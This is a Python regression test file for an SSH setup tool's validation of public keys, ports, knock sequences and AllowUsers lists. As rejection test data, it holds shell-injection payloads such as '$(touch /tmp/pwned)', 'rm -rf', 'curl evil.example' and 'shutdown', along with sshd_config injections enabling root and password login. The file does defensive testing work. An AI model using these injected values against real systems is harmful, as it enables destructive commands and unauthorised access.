"""Regression tests for input validation.

The original public-key pattern was anchored only at the start and allowed any
trailing text, so a pasted "key" could carry shell metacharacters into a
`bash -c` command and silently corrupt authorized_keys.
"""

from __future__ import annotations

import base64
import random

import pytest

from safe_ssh_setup.validation import (
    ValidationError,
    authorized_keys_has_key,
    is_valid_public_key,
    parse_knock_sequence,
    parse_user_list,
    pick_random_port,
    user_in_allow_list,
    validate_algorithm_list,
    validate_port,
    validate_public_key,
)


def make_key(key_type: str = "ssh-ed25519", comment: str = "user@host") -> str:
    body = key_type.encode()
    blob = base64.b64encode(
        len(body).to_bytes(4, "big") + body + b"\x00" * 32
    ).decode()
    return f"{key_type} {blob}" + (f" {comment}" if comment else "")


def test_accepts_a_normal_ed25519_key():
    assert is_valid_public_key(make_key())


def test_accepts_key_without_comment():
    assert is_valid_public_key(make_key(comment=""))


def test_accepts_rsa_and_ecdsa():
    assert is_valid_public_key(make_key("ssh-rsa"))
    assert is_valid_public_key(make_key("ecdsa-sha2-nistp256"))


@pytest.mark.parametrize(
    "payload",
    [
        '$(touch /tmp/pwned)',
        '`id`',
        'x"; touch /tmp/pwned; echo "',
        "x'; rm -rf /tmp/x; '",
        "x && curl evil.example",
        "x | tee /tmp/x",
        "x > /tmp/x",
        "x; shutdown -h now",
    ],
)
def test_rejects_shell_metacharacters_in_comment(payload):
    """Command substitution used to execute, and mangled the stored key."""
    assert not is_valid_public_key(make_key(comment=payload))


def test_rejects_multiline_paste():
    key = make_key()
    assert not is_valid_public_key(key + "\nrm -rf /tmp/x")


def test_rejects_trailing_garbage_after_valid_prefix():
    # The old pattern matched only the prefix and let the rest through.
    assert not is_valid_public_key(make_key() + " $(id)")


def test_rejects_unknown_key_type():
    assert not is_valid_public_key("ssh-magic AAAAB3 test")


def test_rejects_bad_base64():
    assert not is_valid_public_key("ssh-ed25519 not!base64! user@host")


def test_rejects_type_mismatch_between_prefix_and_blob():
    blob = make_key("ssh-rsa").split()[1]
    assert not is_valid_public_key(f"ssh-ed25519 {blob} user@host")


def test_validate_public_key_normalises_whitespace():
    key = make_key()
    assert validate_public_key(f"  {key}  \n") == key


def test_validate_public_key_error_is_user_facing():
    with pytest.raises(ValidationError, match="single line"):
        validate_public_key(make_key() + "\nsecond line")


def test_authorized_keys_detection():
    assert authorized_keys_has_key(make_key())
    assert authorized_keys_has_key(f"# comment\n\n{make_key()}\n")
    assert authorized_keys_has_key(f'restrict,pty {make_key()}')
    assert not authorized_keys_has_key("")
    assert not authorized_keys_has_key("# only a comment\n")


def test_validate_port_range():
    validate_port(2222)
    validate_port(22)
    with pytest.raises(ValidationError):
        validate_port(0)
    with pytest.raises(ValidationError):
        validate_port(70000)
    with pytest.raises(ValidationError):
        validate_port(80)


def test_random_port_avoids_ephemeral_range():
    """Ports in the ephemeral range cause intermittent bind failures at boot."""
    rng = random.Random(1234)
    for _ in range(200):
        port = pick_random_port(32768, in_use=set(), rng=rng)
        assert 1024 <= port < 32768


def test_random_port_avoids_ports_in_use():
    rng = random.Random(7)
    busy = set(range(1024, 32768)) - {5555}
    assert pick_random_port(32768, in_use=busy, rng=rng) == 5555


def test_knock_sequence_requires_three_distinct_ports():
    assert parse_knock_sequence("7000,8000,9000") == [7000, 8000, 9000]
    with pytest.raises(ValidationError):
        parse_knock_sequence("7000,8000")
    with pytest.raises(ValidationError):
        parse_knock_sequence("7000,7000,7000")
    with pytest.raises(ValidationError):
        parse_knock_sequence("7000,notaport,9000")
    with pytest.raises(ValidationError):
        parse_knock_sequence("7000,8000,99999")


def test_user_list_accepts_names_and_host_patterns():
    assert parse_user_list("eirik") == ["eirik"]
    assert parse_user_list("eirik alice") == ["eirik", "alice"]
    assert parse_user_list("eirik, alice") == ["eirik", "alice"]
    assert parse_user_list("eirik@192.168.1.*") == ["eirik@192.168.1.*"]


def test_user_list_deduplicates_and_requires_an_entry():
    assert parse_user_list("eirik eirik") == ["eirik"]
    with pytest.raises(ValidationError):
        parse_user_list("")
    with pytest.raises(ValidationError):
        parse_user_list("   ")


@pytest.mark.parametrize(
    "payload",
    [
        "eirik\nPermitRootLogin yes",
        "eirik\rPermitRootLogin yes",
        "eirik;PasswordAuthentication yes",
        "root#comment",
        "-flag",
        "eirik $(id)",
        'eirik"',
    ],
)
def test_user_list_rejects_config_injection(payload):
    """AllowUsers is written into sshd_config, so nothing may add a directive."""
    with pytest.raises(ValidationError):
        parse_user_list(payload)


def test_spaces_separate_users_rather_than_being_rejected():
    """sshd's AllowUsers is space-separated, so this is two users, not an error."""
    assert parse_user_list("us er") == ["us", "er"]


def test_user_in_allow_list():
    assert user_in_allow_list("eirik", [])          # unrestricted
    assert user_in_allow_list("eirik", ["eirik"])
    assert user_in_allow_list("eirik", ["eirik@10.0.0.*"])
    assert not user_in_allow_list("eirik", ["alice", "bob"])
    assert not user_in_allow_list("eirik", ["eirikson"])


def test_algorithm_list_rejects_metacharacters():
    assert validate_algorithm_list("aes256-gcm@openssh.com", "Ciphers") == [
        "aes256-gcm@openssh.com"
    ]
    with pytest.raises(ValidationError):
        validate_algorithm_list("aes256-gcm@openssh.com\nPermitRootLogin yes", "Ciphers")
    with pytest.raises(ValidationError):
        validate_algorithm_list("$(id)", "Ciphers")
